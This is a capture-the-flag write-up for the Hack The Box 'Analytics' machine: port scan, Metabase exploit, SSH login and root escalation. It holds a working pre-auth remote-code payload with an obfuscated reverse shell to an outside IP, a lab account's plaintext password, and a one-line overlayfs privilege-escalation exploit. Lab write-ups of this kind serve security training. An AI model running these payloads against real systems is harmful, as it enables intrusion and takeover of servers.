# Analytics Write-up

<img src="https://labs.hackthebox.com/storage/avatars/f86fcf4c1cfcc690b43f43e100f89718.png" width="200" height="200">

## Nmap 

 `nmap -sC -sV 10.10.11.233`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
    |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://analytical.htb/
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### CVE

CVE-2023-38646

`git clone https://github.com/securezeron/CVE-2023-38646`

`python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost IP-address --lport 4243`

    {
        "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
        "details": {
            "is_on_demand": false,
            "is_full_sync": false,
            "is_sample": false,
            "cache_ttl": null,
            "refingerprint": false,
            "auto_run_queries": true,
            "schedules": {},
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjkxLzQyNDMgMD4mMQ==}|{base64,-d}|{bash,-i}')\n$$--=x",
                "advanced-options": false,
                "ssl": true
            },
            "name": "test",
            "engine": "h2"
        }
    }

### SSH

`ssh metalytics@analytical.htb`

An4lytics_ds20223#

Get user flag 

![image](https://github.com/zer00d4y/writeups/assets/128820441/c6534605-9c37-42e8-9d09-51651e677bbd)

## Privilege Escalation

![image](https://github.com/zer00d4y/writeups/assets/128820441/a3cdb4ac-ecf8-4025-a09d-a7866945417e)

    unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'

![image](https://github.com/zer00d4y/writeups/assets/128820441/3940a731-da2a-43c3-aeea-281e9f2a0384)
